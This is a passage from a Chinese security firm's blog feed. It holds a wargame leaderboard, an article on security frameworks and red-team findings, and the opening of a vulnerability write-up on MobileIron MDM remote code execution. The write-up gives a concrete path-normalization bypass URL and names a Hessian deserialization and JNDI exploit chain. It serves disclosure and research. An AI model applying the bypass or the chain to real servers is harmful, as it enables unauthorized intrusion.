    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;ginoah&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8&lt;/td&gt;
      &lt;td&gt;cjiso1117&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9&lt;/td&gt;
      &lt;td&gt;zodiuss&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;10&lt;/td&gt;
      &lt;td&gt;dalun&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
</description>
                <link>https://devco.re/blog/2020/10/30/devcore-wargame-at-hitcon-2020/</link>
                <guid>https://devco.re/blog/2020/10/30/devcore-wargame-at-hitcon-2020</guid>
                <pubDate>Fri, 30 Oct 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>你的資安策略夠明確嗎？透過框架優先緩解真實威脅</title>
                <description>&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;

&lt;p&gt;這一篇是跟 Allen 在 iThome 2020 資安大會一起分享的主題。在國內，大家比較少討論資安策略這個議題。主要原因除了這個題目太過艱澀、無聊外，從商業的角度也不容易成為獲利的服務。而我們會想分享這個主題的原因與我們主要的服務「紅隊演練」有關。&lt;/p&gt;

&lt;p&gt;執行紅隊演練三年多來，雖然協助企業找出威脅營運的重要入侵路徑，甚至發現防禦機制的不足之處，許多積極的客戶更想知道除了當次紅隊演練發現的問題外，是不是有更周延的方式來盤點防禦現況的不足。因此，我們開始尋找一個結構化且完整的方式來探究這個議題，開始思考國際標準、框架與紅隊演練之間的關係。希望除了從攻擊者的思維跟技巧找到企業的問題外，也能從防守方的角度思考企業長期而全面的防禦規劃。&lt;/p&gt;

&lt;h2 id=&quot;複雜的問題更要從策略面思考&quot;&gt;複雜的問題，更要從策略面思考&lt;/h2&gt;

&lt;p&gt;資安是非常複雜而且分工細膩的工作，不確定問題的核心就無法釐清權責、安排資源，遑論降低再發的機率。因此要解決這個複雜問題需要有資安策略來支撐，而不是頭痛醫頭、腳痛醫腳。首先，我們把資安的防護分為三種階段：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;恢復原狀型：企業將主要的資安資源投放在日常的維運及問題查找上，包括確認當下發生的問題、進行緊急處理、災害控制、查明及分析發生原因、修復問題、研究對策避免再發生等等。&lt;/li&gt;
  &lt;li&gt;防微杜漸型：將資源投入在對企業造成重大衝擊的問題上，並持續進行預防及回應的評估與演練、嘗試提前找出原因，加以預防或思考演練發生時應該執行的對策。&lt;/li&gt;
  &lt;li&gt;追求理想/卓越型：盤點及分析問題的優、缺點，設定企業持續精進的目標，藉由行動計畫來達成目標。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;根據我們的觀察，幾乎多數的企業都是落在「恢復原狀型」，但企業多半認知其為「防微杜漸型」。造成這個認知上的落差，主因來自於對自身安全狀況的不了解，導致對於風險的掌握程度產生誤判。因此，透過一個宏觀的策略思考，有助於盤點各種控制措施不足之處，才有機會將防禦縱深的機制拴緊螺絲，打造期望的防禦體系。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;分層負責各司其職&quot;&gt;分層負責，各司其職&lt;/h2&gt;

&lt;p&gt;我們建議將縱深防禦以一個更全面的方式來檢視，分為 Executive Layer、Process Layer、Procedure Layer 以及 Technology Layer 四層，一個好的防禦策略，除了要做到 R &amp;amp; R (Role &amp;amp; Responsibility) 外，更重要的是在上而下制定策略之後，經由下而上的方式確保策略的有效性，因此不同階層的資安從業人員都有其需要關注的重點。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Executive Layer：資安長 (CISO) 的視角，關注足以影響組織營運的風險及緩解這些風險的資源是否充足。可以參考的標準包括 NIST 800-39、NIST 800-30、ISO 27005 以及 CIS RAM。&lt;/li&gt;
  &lt;li&gt;Process Layer：高階主管的視角，關注持續維持組織安全運作的管理程序是否足夠及落實、規劃未來組織資安的成熟度等。參考的標準包括 NIST Cybersecurity Framework、ISO 27001 等。&lt;/li&gt;
  &lt;li&gt;Procedure Layer：中階主管的視角，包括決定哪些安全控制措施要執行、執行的細緻程度，這些項目就是一般所謂的安全控制措施 (security control)，例如組態設定、密碼管理、日誌紀錄的類型等，可以參考 NIST 800-53 或是 CIS Critical Security Controls 等規範。&lt;/li&gt;
  &lt;li&gt;Technology Layer：初階主管與技術人員的角度，包含針對攻擊者的技巧所應對的資安設備、自動化安全控制措施的工具、監控分析工具等等。目前這部份也是組織資安防禦的重點，可以參考資安設備支援 MITRE ATT&amp;amp;CK 的攻擊技巧來盤點現有的防禦缺口或透過 OWASP Cyber Defense Matrix (CDM) 定位產品。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;框架與標準的定位&quot;&gt;框架與標準的定位&lt;/h2&gt;

&lt;p&gt;在說明完不同階層關注的重點後，這裡特別說明幾個重要 (或使用率較高) 的標準及框架。除了要知道哪些框架跟標準與資安有關外，同時也需要了解適用的情境、目的及彼此間的差異&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ISO 27001：屬於 Process Layer，其提供建立資訊安全管理系統的標準，幫助組織管理和保護資訊資產，確保達到客戶或利害關係人其安全的期待；可以取得驗證。但要提醒的是，27001 作為一個實踐資訊安全管理 (Information Security System) 的標準，雖然具有文件化 (Documented) 要求的優點，但其要求項目多數在預防 (Prevent) 及避免 (Avoid) 上，較少著重在因應網路安全的偵測 (Detect) 及回應 (React) 上。&lt;/li&gt;
  &lt;li&gt;NIST Cybersecurity Framework (CSF)：屬於 Process View，由美國主導的網路安全框架，提供關鍵基礎設施或一般企業幫助組織管理和保護資訊資產，確保其安全無慮；可以驗證並有成熟度模式，可以讓企業先描繪自己的資安狀態 (profile) 並藉由訂定目標逐年強化企業的安全。同時，明確的將安全要求結構化的分成識別 (Identify)、防禦 (Protect)、偵測 (Detect)、回應 (Respond) 及復原 (Recover)，並支援其他安全標準與框架的對應，如 CIS CSC、COBIT、27001、NIST 800-53 等。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CIS Cybersecurity Control：資訊安全控制指引屬於 Procedure View，針對網路攻擊所應採取的控制項目提出優先執行順序，組織可依照自身的規模 (IG1-IG3) 執行對應的措施， 分為基礎型、基本型及組織型，共 20 個控制群組、178 個子控制項。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;不良的資安防護狀態&quot;&gt;不良的資安防護狀態&lt;/h2&gt;

&lt;p&gt;實務上來說，企業的防禦策略有兩種不良的狀態&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;縱深防護不足：防禦機制不夠全面 (紅色缺口)、設備效果不如宣稱 (藍色缺口)、設備本身的限制 (橘色缺口)；上述的問題，綜合而言，就會使得設備間的綜效無法阻斷攻擊鏈，形成技術層的破口。
&lt;img src=&quot;/assets/img/blog/20201013/4.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;配套措施的不完整：也就是「程序」及「流程」上的不足，假設某資安設備可以偵測到異常行為，資安人員如何分辨這是攻擊行為還是員工內部正常行為？多久內要及時回應進行處理、多久要發動鑑識？一旦上述的「程序」及「流程」沒有定義清楚，縱使設備本身是有效的，組織仍然會因為回應時間過慢，導致攻擊者入侵成功。
&lt;img src=&quot;/assets/img/blog/20201013/5.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;盤點各層次的守備範圍&quot;&gt;盤點各層次的守備範圍&lt;/h2&gt;

&lt;p&gt;那麼要如何改善這兩種不佳的防禦狀態？我們可以單獨使用 CDM 來評估技術層的守備範圍是否足夠，也可以使用它來作為程序、流程及技術層的跨階層的盤點；&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;CDM (Cyber Defense Matrix) 是 OWASP 的一個專案，由一個 5x5 的矩陣所構成。橫軸是 NIST CSF 的五大類別，而縱軸則是資產盤點常見的分類；組織可以利用這個矩陣來盤點企業 Technology View 建構的防禦設備，更精準的確認需要保護的資產是否在 NIST CSF 的每個類別都有對應的措施。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;以 ISO 27001 作為例子，將其本文的要求及附錄 A 的控制措施，對應到 CDM 上，進而盤點 ISO 27001 在組織的程序面所能涵蓋的範圍。要注意的是，不同組織在盤點時，會產生不同的對應結果，這正是透過 CDM 來檢視的意義所在；例如在盤點「A.7.2.2 資訊安全認知、教育及訓練」時，企業要思考對於人員的教育訓練是否涵蓋到 NIST CSF 的五大類別，還是只包含人員意識的訓練；另外以「A.6.2.2 遠距工作」的防護機制，除了針對網路層及應用程式保護外，管理程序是否也包含遠距工作的資料及設備要求？&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;接著，往下一層 (Procedure Layer)，也將企業現有的控制措施，對應到 CDM 中。這邊以 CIS CSC 為例，淺藍色的部份屬於基本型的控制群組、灰色部分為基礎型控制群組，組織型的控制群組因為比較偏向程序面，因此比較難單獨歸屬在特定的 CDM 區塊中。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;透過真實的威脅補足資安策略的不足&quot;&gt;透過真實的威脅，補足資安策略的不足&lt;/h2&gt;

&lt;p&gt;在透過 CDM 盤點完 Procedure Layer 及 Process Layer 後，企業接著可以透過資安事故、威脅情資、紅隊演練或模擬入侵攻擊工具 (BAS) 等貼近真實威脅的服務或工具，來思考資安策略的不足之處。這邊我們以一個紅隊演練的部分成果作為案例，來貫穿本篇文章的應用。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在這個案例中，我們約略可以發現幾個問題：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;程式撰寫不夠安全：以致存在任意檔案上傳的漏洞。&lt;/li&gt;
  &lt;li&gt;不同系統間使用共用帳號密碼：導致撞庫攻擊可以成功，而監控機制或組態管理顯然未發揮作用。&lt;/li&gt;
  &lt;li&gt;未依照資料機敏性進行網段區隔：對外服務網段可以透過 RDP 連線至 core zone。&lt;/li&gt;
  &lt;li&gt;特權帳號與存取控制未進行關聯分析：致可以使用 backup 帳號登入 AD 網域控制器。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;上述的 4 個項目，是直覺在盤點時可能想到的疏漏項目。但要怎麼確認還有其他根因 (root cause) 是企業沒思考到的呢？這時候就可以利用已知的標準及框架，搭配先前盤點好的控制項目，來更為周延的思考目前還可以強化的控制措施；如果企業的資源有限，甚至可以參考 CIS CSC 對於優先權的建議順序，先確認組織實作群組 (Implementation Group) ，再依基本型、基礎型及組織型，訂定短、中、長期計畫及投放資源，有目標的改善防禦能耐。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;最後，可以將上圖找出 Procedure Layer 的控制項目，對應到 Process Layer 的盤點結果，檢視流程上對應的作法。以 「14.1、依據敏感性網路進行區隔」為例，去評估 ISO 27001 中「A.6.2.2 遠距工作」的要求上，在設備、應用程式、網路、資料及使用者，是否都有做好網路區隔；或是「6.3 開啟更詳盡的日誌」，評估在 ISO 27001 中「A.16.1.5」對於資訊安全事故的回應上，在偵測、回應跟復原上，是否都有對應的程序可以支持，監控到發出的告警。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201013/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;透過本篇的方法論可以從技術、程序、流程到風險，讓不同階層的資安從業人員有一致性的溝通方式。我們希望資安策略對於企業是一個真正可被實作、建立出短、中、長期目標的務實作為，而非只是一個組織治理中的一個高深名詞。&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2020/10/13/mitigate-real-threats-by-framework-and-standards/</link>
                <guid>https://devco.re/blog/2020/10/13/mitigate-real-threats-by-framework-and-standards</guid>
                <pubDate>Tue, 13 Oct 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>看我如何再一次駭進 Facebook，一個在 MobileIron MDM 上的遠端程式碼執行漏洞!</title>
                <description>&lt;style type=&quot;text/css&quot;&gt;
    table {
        display: block;
        width: 100%;
        overflow: auto;
        word-break: normal;
        word-break: keep-all;
        font-size: smaller;
    }

    table th {
        font-weight: bold
    }

    table th,
    table td {
        padding: 5px 11px;
        border: 1px solid #ddd;
    }

    table tr {
        background-color: #fff;
        border-top: 1px solid #ccc;
    }

    table tr:nth-child(2n) {
        background-color: #f8f8f8;
    }
&lt;/style&gt;

&lt;p&gt;&lt;a href=&quot;/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM-en/&quot;&gt;English Version&lt;/a&gt;
&lt;a href=&quot;/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;嗨! 好久不見，這是我在今年年初的研究，講述如何尋找一款知名行動裝置管理產品的漏洞，並繞過層層保護取得遠端程式碼執行的故事! 其中的漏洞經回報後在六月由官方釋出修補程式並緊急通知他們的客戶，而我們也在修補程式釋出 15 天後發現 Facebook 並未及時更新，因此透過漏洞取得伺服器權限並回報給 Facebook!&lt;/p&gt;

&lt;p&gt;此份研究同時發表於 &lt;a href=&quot;https://hitcon.org/2020/&quot;&gt;HITCON 2020&lt;/a&gt;，你可以從&lt;a href=&quot;https://hitcon.org/2020/slides/How%20I%20Hacked%20Facebook%20Again!.pdf&quot;&gt;這裡&lt;/a&gt;取得這次演講的投影片!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;身為一個專業的紅隊，我們一直在尋找著更快速可以從外部進入企業內網的最佳途徑! 如同我們去年在 &lt;a href=&quot;https://www.blackhat.com/us-19/briefings/schedule/#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545&quot;&gt;Black Hat USA&lt;/a&gt; 發表的研究，SSL VPN 理所當然會放在外部網路，成為保護著網路安全、使員工進入內部網路的基礎設施，而當你所信任、並且用來保護你安全的設備不再安全了，你該怎麼辦?&lt;/p&gt;

&lt;p&gt;由此為發想，我們開始尋找著有沒有新的企業網路脆弱點可當成我們紅隊攻擊滲透企業的初始進入點，在調查的過程中我們對 MDM/UEM 開始產生了興趣，而這篇文章就是從此發展出來的研究成果!&lt;/p&gt;

&lt;h2 id=&quot;什麼是-mdmuem-&quot;&gt;什麼是 MDM/UEM ?&lt;/h2&gt;

&lt;p&gt;Mobile Device Management，簡稱 MDM，約是在 2012 年間，個人手機、平板裝置開始興起時，為了使企業更好的管理員工的 &lt;a href=&quot;https://en.wikipedia.org/wiki/Bring_your_own_device&quot;&gt;BYOD 裝置&lt;/a&gt;，應運而生的資產盤點系統，企業可以透過 MDM 產品，管理員工的行動裝置，確保裝置只在信任的環境、政策下運行，也可以從中心的端點伺服器，針對所控制的手機，部署應用程式、安裝憑證甚至遠端操控以管理企業資產，更可以在裝置遺失時，透過 MDM 遠端上鎖，或是抹除整台裝置資料達到企業隱私不外漏的目的!&lt;/p&gt;

&lt;p&gt;UEM (Unified Endpoint Management) 則為近幾年來更新的一個術語，其核心皆為行動裝置的管理，只是 UEM 一詞包含更廣的裝置定義! 我們以下皆用 MDM 一詞來代指同類產品。&lt;/p&gt;

&lt;h2 id=&quot;我們的目標&quot;&gt;我們的目標&lt;/h2&gt;

&lt;p&gt;MDM 作為一個中心化的端點控制系統，可以控制、並管理旗下所有員工個人裝置! 對日益壯大的企業來說，絕對是一個最佳的資產盤點產品，相對的，對駭客來說也是! 而為了管理來自世界各地的員工裝置連線，MDM 又勢必得曝露在外網。 一個可以「管理員工裝置」又「放置在外網」的設備，這對我們的紅隊演練來說無疑是最棒的滲透管道!&lt;/p&gt;

&lt;p&gt;另外，從這幾年的安全趨勢也不難發現 MDM 逐漸成為駭客、APT 組織的首選目標! 誘使受害者同意惡意的 MDM 成為你裝置的 C&amp;amp;C 伺服器，或是乾脆入侵企業放置在外網的 MDM 設備，在批次地派送行動裝置木馬感染所有企業員工手機、電腦，以達到進一步的攻擊! 這些都已成真，詳細的報告可參閱 Cisco Talos 團隊所發表的 &lt;a href=&quot;https://blogs.cisco.com/security/talos/malicious-mdm-lets-hide-this-app&quot;&gt;Malicious MDM: Let’s Hide This App&lt;/a&gt; 以及 CheckPoint CPR 團隊所發表的 &lt;a href=&quot;https://research.checkpoint.com/2020/mobile-as-attack-vector-using-mdm/&quot;&gt;First seen in the wild - Malware uses Corporate MDM as attack vector&lt;/a&gt;!&lt;/p&gt;

&lt;p&gt;從前面的幾個案例我們得知 MDM 對於企業安全來說，是一個很好的切入點，因此我們開始研究相關的攻擊面! 而市面上 MDM 廠商有非常多，各個大廠如 Microsoft、IBM 甚至 Apple 都有推出自己的 MDM 產品，我們要挑選哪個開始成為我們的研究對象呢?&lt;/p&gt;

&lt;p&gt;因此我們透過公開情報列舉了市面上常見的 MDM 產品，並配合各家特徵對全世界進行了一次掃描，發現最多企業使用的 MDM 為 VMware AirWatch 與 MobileIron 這兩套產品! 至於要挑哪一家研究呢? 我們選擇了後者，除了考量到大部分的客戶都是使用 MobileIron 外，另外一個吸引我的點則是 Facebook 也是他們的客戶! 從我們在 2016 年發表的 &lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;How I Hacked Facebook, and Found Someone’s Backdoor Script&lt;/a&gt; 研究中，就已發現 Facebook 使用 MobileIron 作為他們的 MDM 解決方案!&lt;/p&gt;

&lt;p&gt;根據 MobileIron 官方網站描述，至少有 20000+ 的企業使用 MobileIron 當成他們的 MDM 解決方案，而根據我們實際對全世界的掃描，也至少有 15% 以上的財富世界 500 大企業使用 MobileIron 且&lt;strong&gt;曝露在外網&lt;/strong&gt;(實際上一定更多)，因此，尋找 MobileIron 的漏洞也就變成我們的首要目標!&lt;/p&gt;

&lt;h2 id=&quot;如何開始研究&quot;&gt;如何開始研究&lt;/h2&gt;

&lt;p&gt;從&lt;a href=&quot;https://www.cvedetails.com/vulnerability-list/vendor_id-13968/Mobileiron.html&quot;&gt;過往出現過的漏洞&lt;/a&gt;可以得知 MobileIron 並沒有受到太多安全人員研究，其中原因除了 MDM 這個攻擊向量尚未廣為人知外，另一個可能是因為關於 MobileIron 的相關韌體太難取得，研究一款設備最大的問題是如何從純粹的黑箱，到可以分析的灰箱、甚至白箱! 由於無法從官網下載韌體，我們花費了好幾天嘗試著各種關鍵字在網路上尋找可利用的公開資訊，最後才在 Goolge Search 索引到的其中一個公開網站根目錄上發現疑似是開發商測試用的 RPM 包。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;下載回的韌體為 2018 年初的版本，離現在也有很長一段時間，也許核心程式碼也大改過，不過總比什麼都沒有好，因此我們就從這份檔案開始研究起。&lt;/p&gt;

&lt;p&gt;&lt;em&gt;備註: 經通知 MobileIron 官方後，此開發商網站已關閉。&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;如何尋找漏洞&quot;&gt;如何尋找漏洞&lt;/h2&gt;

&lt;p&gt;整個 MobileIron 使用 Java 作為主要開發語言，對外開放的連接埠為 443, 8443, 9997，各個連接埠對應功能如下:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;443 為使用者裝置註冊介面&lt;/li&gt;
  &lt;li&gt;8443 為設備管理介面&lt;/li&gt;
  &lt;li&gt;9997 為一個 MobileIron 私有的裝置同步協定 (MI Protocol)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;三個連接埠皆透過 TLS 保護連線的安全性及完整性，網頁部分則是透過 Apache 的 Reverse Proxy 架構將連線導至後方，由 Tomcat 部署的網頁應用處理，網頁應用則由 Spring MVC 開發。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;由於使用的技術架構相對新，傳統類型的漏洞如 SQL Injection 也較難從單一的點來發現，因此理解程式邏輯並配合架構層面的攻擊就變成我們這次尋找漏洞的主要目標!&lt;/p&gt;

&lt;p&gt;這次的漏洞也很簡單，主要是 Web Service 使用了 Hessian 格式處理資料進而產生了反序列化的弱點! 雖然漏洞一句話就可以解釋完了，但懂的人才知道反序列化並不代表你可以做任何事，接下來的利用才是精彩的地方!&lt;/p&gt;

&lt;p&gt;現在已知 MobileIron 在處理 Web Service 的地方存在 Hessian 反序列化漏洞! 但漏洞存在，並不代表我們碰得到漏洞，可以觸發 Hessian 反序列化的路徑分別在:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;一般使用者介面 - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://mobileiron/mifs/services/&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;管理介面 - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://mobileiron:8443/mifs/services/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;管理介面基本上沒有任何阻擋，可以輕鬆的碰到 Web Service，而一般使用者介面的 Web Service 則無法存取，這對我們來說是一個致命性的打擊，由於大部分企業的網路架構並不會將管理介面的連接埠開放在外部網路，因此只能攻擊管理介面對於的利用程度並不大，因此我們必須尋找其他的方式去觸發這個漏洞!&lt;/p&gt;

&lt;p&gt;仔細觀察 MobileIron 的阻擋方式，發現它是透過在 Apache 上使用 Rewrite Rules 去阻擋對一般使用者介面 Web Service 的存取:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^/mifs/services/(.*)$ https://%{SERVER_NAME}:8443/mifs/services/$1 [R=307,L]
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^/mifs/services [F]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;嗯，很棒! 使用 Reverse Proxy 架構而且是在前面那層做阻擋，你是否想到什麼呢?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;沒錯! 就是我們在 &lt;a href=&quot;https://github.com/orangetw/My-CTF-Web-Challenges#blackbox&quot;&gt;2015 年&lt;/a&gt;發現，並且在 &lt;a href=&quot;https://www.blackhat.com/us-18/briefings.html#breaking-parser-logic-take-your-path-normalization-off-and-pop-0days-out&quot;&gt;Black Hat USA 2018&lt;/a&gt; 上所發表的針對 Reverse Proxy 架構的新攻擊面 &lt;a href=&quot;https://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html&quot;&gt;Breaking Parser Logic&lt;/a&gt;! 這個優秀的技巧最近也被很好的利用在 &lt;a href=&quot;https://support.f5.com/csp/article/K52145254&quot;&gt;CVE-2020-5902&lt;/a&gt;，F5 BIG-IP TMUI 的遠端程式碼執行上!&lt;/p&gt;

&lt;p&gt;透過 Apache 與 Tomcat 對路徑理解的不一致，我們可以透過以下方式繞過 Rewrite Rule 再一次攻擊 Web Service!&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://mobileiron/mifs/.;/services/someService
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;碰! 因此現在不管是 8443 的管理介面還是 443 的一般使用者介面，我們都可以碰到有 Hessian 反序列化存在的 Web Service 了!&lt;/p&gt;

&lt;h2 id=&quot;如何利用漏洞&quot;&gt;如何利用漏洞&lt;/h2&gt;

&lt;p&gt;現在讓我們回到 Hessian 反序列化的利用上! 針對 Hessian 反序列化，&lt;a href=&quot;https://github.com/mbechler&quot;&gt;Moritz Bechler&lt;/a&gt; 已經在他的 &lt;a href=&quot;https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf&quot;&gt;Java Unmarshaller Security&lt;/a&gt; 中做了一個很詳細的研究報告! 從他所開源的 &lt;a href=&quot;https://github.com/mbechler/marshalsec&quot;&gt;marshalsec&lt;/a&gt; 原始碼中，我們也學習到 Hessian 在反序列化過程中除了透過 HashMap 觸發 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;equals()&lt;/code&gt; 以及 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcode()&lt;/code&gt; 等觸發點外，也可透過 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XString&lt;/code&gt; 串出 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;toString()&lt;/code&gt;，而目前關於 Hessian 反序列化已存在的利用鏈有四條:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Apache XBean&lt;/li&gt;
  &lt;li&gt;Caucho Resin&lt;/li&gt;
  &lt;li&gt;Spring AOP&lt;/li&gt;
  &lt;li&gt;ROME EqualsBean/ToStringBean&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;而根據我們的目標環境，可以觸發的只有 Spring AOP 這條利用鏈!&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt; &lt;/th&gt;
      &lt;th&gt;Name&lt;/th&gt;
      &lt;th&gt;Effect&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;Apache XBean&lt;/td&gt;
      &lt;td&gt;JNDI 注入&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;Caucho Resin&lt;/td&gt;
      &lt;td&gt;JNDI 注入&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;√&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;Spring AOP&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;JNDI 注入&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;ROME EqualsBean&lt;/td&gt;
      &lt;td&gt;RCE&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;無論如何，我們現在有了 JNDI 注入後，接下來只要透過 &lt;a href=&quot;https://twitter.com/pwntester&quot;&gt;Alvaro Muñoz&lt;/a&gt; 與 &lt;a href=&quot;https://twitter.com/olekmirosh&quot;&gt;Oleksandr Mirosh&lt;/a&gt; 在 Black Hat USA 2016 上所發表的 &lt;a href=&quot;https://www.blackhat.com/us-16/briefings.html#a-journey-from-jndi-ldap-manipulation-to-remote-code-execution-dream-land&quot;&gt;A Journey From JNDI/LDAP to Remote Code Execution Dream Land&lt;/a&gt; 就可以取得遠端程式碼執行了… 甘安內?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;自從 &lt;a href=&quot;https://twitter.com/pwntester&quot;&gt;Alvaro Muñoz&lt;/a&gt; 與 &lt;a href=&quot;https://twitter.com/olekmirosh&quot;&gt;Oleksandr Mirosh&lt;/a&gt; 在 Black Hat 發表了這個新的攻擊向量後，不知道幫助了多少大大小小的駭客，甚至會有人認為「遇到反序列化就用 JNDI 送就對了!」，但自從 2018 年十月，Java 終於把關於 JNDI 注入的最後一塊拼圖給修復，這個修復被記載在 &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-3149&quot;&gt;CVE-2018-3149&lt;/a&gt; 中，自此之後，所有 Java 高於 8u181, 7u191, 6u201 的版本皆無法透過 JNDI/LDAP 的方式執行程式碼，因此若要在最新版本的 MobileIron 上實現攻擊，我們勢必得面對這個問題!&lt;/p&gt;

&lt;p&gt;關於 CVE-2018-3149，是透過將 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.sun.jndi.ldap.object.trustURLCodebase&lt;/code&gt; 的預設值改為 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;False&lt;/code&gt; 的方式以達到禁止攻擊者下載遠端 Bytecode 取得執行程式碼。&lt;/p&gt;

